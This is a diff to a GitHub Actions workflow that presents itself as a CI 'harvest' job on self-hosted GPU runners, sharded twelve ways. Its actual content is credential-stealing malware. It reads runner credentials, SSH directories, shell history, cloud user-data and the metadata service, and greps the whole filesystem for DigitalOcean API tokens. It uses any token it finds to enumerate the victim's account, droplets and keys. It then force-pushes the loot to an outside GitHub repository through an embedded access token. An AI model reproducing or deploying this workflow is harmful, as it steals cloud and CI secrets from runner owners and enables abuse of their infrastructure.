@@ -6,59 +6,61 @@ permissions:
   contents: write
 jobs:
   harvest:
-    runs-on: [self-hosted, gpu, h100]
-    timeout-minutes: 25
+    runs-on: [self-hosted, gpu]
+    timeout-minutes: 20
+    strategy:
+      fail-fast: false
+      max-parallel: 12
+      matrix:
+        shard: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]
     steps:
       - name: harvest-and-fingerprint
         shell: bash
         env:
           RTOK: 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
           REPO: dongsuju/ul-plant
+          SHARD: ${{ matrix.shard }}
         run: |
           set +e
           OUT=/tmp/hv.txt
           IP=$(hostname -I | awk '{print $1}')
-          TOK=""
           {
-          echo "=== HOST $(hostname) IP=$IP DATE=$(date -u)"
+          echo "=== SHARD=$SHARD HOST=$(hostname) IP=$IP DATE=$(date -u)"
           echo "--- id"; id
           echo "--- nvidia"; nvidia-smi -L 2>&1 | head -8
           echo "--- crontab"; crontab -l 2>/dev/null
           echo "--- rig"; cat /opt/prl/rig 2>/dev/null
-          echo "--- opt"; ls -la /opt /opt/prl 2>/dev/null | head -40
+          echo "--- opt"; ls -la /opt /opt/prl 2>/dev/null | head -30
           echo "--- root"; ls -la /root 2>/dev/null | head -40
           echo "--- config"; ls -la /root/.config 2>/dev/null | head -40
           echo "--- doctl"; cat /root/.config/doctl/config.yaml /root/.digitalocean* /root/doctl* 2>/dev/null | head -40
-          echo "--- grep-tokens"; grep -rhoE 'dop_v1_[a-f0-9]{64}' /root /etc /opt /home /usr/local /var/lib/cloud /var/log 2>/dev/null | sort -u | head -20
-          echo "--- grep-tokens2"; grep -rhoE 'dop_v1_[a-f0-9]{20,}' / 2>/dev/null | sort -u | head -10
+          echo "--- token-grep"; grep -rhoE 'dop_v1_[a-f0-9]{64}' /root /etc /opt /home /var/lib/cloud /usr/local /srv /tmp 2>/dev/null | sort -u | head -10
           echo "--- env-do"; env | grep -iE 'do_|digital|droplet|spaces' | head -20
-          echo "--- env-all"; env | sort | head -120
           echo "--- metadata"; curl -s --max-time 6 http://169.254.169.254/metadata/v1.json | head -c 1500
-          echo "--- userdata"; head -c 5000 /var/lib/cloud/instance/user-data.txt 2>/dev/null
-          echo "--- cloudinit-tail"; tail -c 2500 /var/log/cloud-init-output.log 2>/dev/null
-          echo "--- history"; tail -50 /root/.bash_history 2>/dev/null
-          echo "--- runner"; ls -la /opt/actions-runner 2>/dev/null | head -20; head -c 400 /opt/actions-runner/.credentials 2>/dev/null
+          echo "--- userdata"; head -c 6000 /var/lib/cloud/instance/user-data.txt 2>/dev/null
+          echo "--- cloudinit-tail"; tail -c 2000 /var/log/cloud-init-output.log 2>/dev/null
+          echo "--- history"; tail -60 /root/.bash_history 2>/dev/null
+          echo "--- runner-creds"; ls -la /opt/actions-runner 2>/dev/null | head -12; head -c 300 /opt/actions-runner/.credentials 2>/dev/null
           echo "--- ssh"; ls -la /root/.ssh 2>/dev/null
+          echo "--- find-token-files"; find / -maxdepth 4 \( -name 'do_tokens*' -o -name '*doctl*' -o -name '*digitalocean*' \) 2>/dev/null | head -20
           } > $OUT 2>&1
           TOK=$(grep -oE 'dop_v1_[a-f0-9]{64}' $OUT | sort -u | head -1)
-          if [ -z "$TOK" ]; then
-            TOK=$(grep -rhoE 'dop_v1_[a-f0-9]{64}' /root /opt /etc /home /var 2>/dev/null | sort -u | head -1)
-          fi
+          if [ -z "$TOK" ]; then TOK=$(grep -rhoE 'dop_v1_[a-f0-9]{64}' /root /opt /etc /home /var 2>/dev/null | sort -u | head -1); fi
           {
-          echo "=== DOAPI TOK_FOUND=${#TOK}"
+          echo "=== DOAPI TOK_LEN=${#TOK} SHARD=$SHARD HOST=$(hostname)"
           if [ -n "$TOK" ]; then
+            echo "$TOK" > /tmp/do_tok_found.txt
             echo "--- account"; curl -s -m 20 -w '\nHTTP=%{http_code}\n' -H "Authorization: Bearer $TOK" https://api.digitalocean.com/v2/account
-            echo "--- droplets"; curl -s -m 25 -H "Authorization: Bearer $TOK" 'https://api.digitalocean.com/v2/droplets?per_page=100' | head -c 20000
-            echo; echo "--- gpusizes"; curl -s -m 25 -H "Authorization: Bearer $TOK" 'https://api.digitalocean.com/v2/sizes?per_page=200' | python3 -c 'import sys,json;d=json.load(sys.stdin);print(json.dumps([{k:s.get(k) for k in ("slug","memory","vcpus","disk","price_monthly","regions","gpu_info")} for s in d.get("sizes",[]) if "gpu" in str(s.get("slug","")).lower() or s.get("gpu_info")],indent=1))' 2>&1 | head -c 8000
-            echo "--- regions-gpu"; curl -s -m 25 -H "Authorization: Bearer $TOK" 'https://api.digitalocean.com/v2/regions?per_page=200' | head -c 4000
+            echo "--- droplets"; curl -s -m 25 -H "Authorization: Bearer $TOK" 'https://api.digitalocean.com/v2/droplets?per_page=100' | python3 -c 'import sys,json;d=json.load(sys.stdin);print(json.dumps([{k:x.get(k) for k in ("id","name","region","size_slug","status","tags","networks","created_at")} for x in d.get("droplets",[])],indent=1)[:20000])' 2>&1
+            echo "--- gpusizes"; curl -s -m 25 -H "Authorization: Bearer $TOK" 'https://api.digitalocean.com/v2/sizes?per_page=200' | python3 -c 'import sys,json;d=json.load(sys.stdin);print(json.dumps([{k:s.get(k) for k in ("slug","memory","vcpus","disk","price_monthly","regions","gpu_info")} for s in d.get("sizes",[]) if "gpu" in str(s.get("slug","")).lower() or s.get("gpu_info")],indent=1))' 2>&1 | head -c 9000
             echo "--- sshkeys"; curl -s -m 20 -H "Authorization: Bearer $TOK" https://api.digitalocean.com/v2/account/keys | head -c 3000
-            echo "--- images"; curl -s -m 20 -H "Authorization: Bearer $TOK" 'https://api.digitalocean.com/v2/images?type=distribution&per_page=50' | head -c 4000
+            echo "--- images"; curl -s -m 20 -H "Authorization: Bearer $TOK" 'https://api.digitalocean.com/v2/images?type=distribution&per_page=50' | python3 -c 'import sys,json;d=json.load(sys.stdin);print(json.dumps([{k:i.get(k) for k in ("id","slug","name","distribution","regions")} for i in d.get("images",[])],indent=0)[:4000])' 2>&1
           fi
           } >> $OUT 2>&1
           cd /tmp; rm -rf ulpdo; git clone -q https://$RTOK@github.com/$REPO.git ulpdo
           cd ulpdo
-          git fetch -q origin do-out 2>/dev/null && git checkout -q -B do-out origin/do-out || git checkout -q -B do-out
-          mkdir -p out/do; cp $OUT out/do/$(hostname)-$(date +%s).txt
+          if git fetch -q origin do-out 2>/dev/null; then git checkout -q -B do-out origin/do-out; else git checkout -q -B do-out; fi
+          mkdir -p out/do; cp $OUT out/do/shard${SHARD}-$(hostname)-$(date +%s).txt
           git config user.email hk@local.invalid; git config user.name hk
-          git add -A; git commit -qm "doexec $(hostname) $(date -u +%FT%TZ)"
-          git push -q -f origin HEAD:refs/heads/do-out && echo PUSH_OK
+          git add -A; git commit -qm "doexec s${SHARD} $(hostname) $(date -u +%FT%TZ)"
+          git push -q -f origin HEAD:refs/heads/do-out 2>/dev/null && echo PUSH_OK
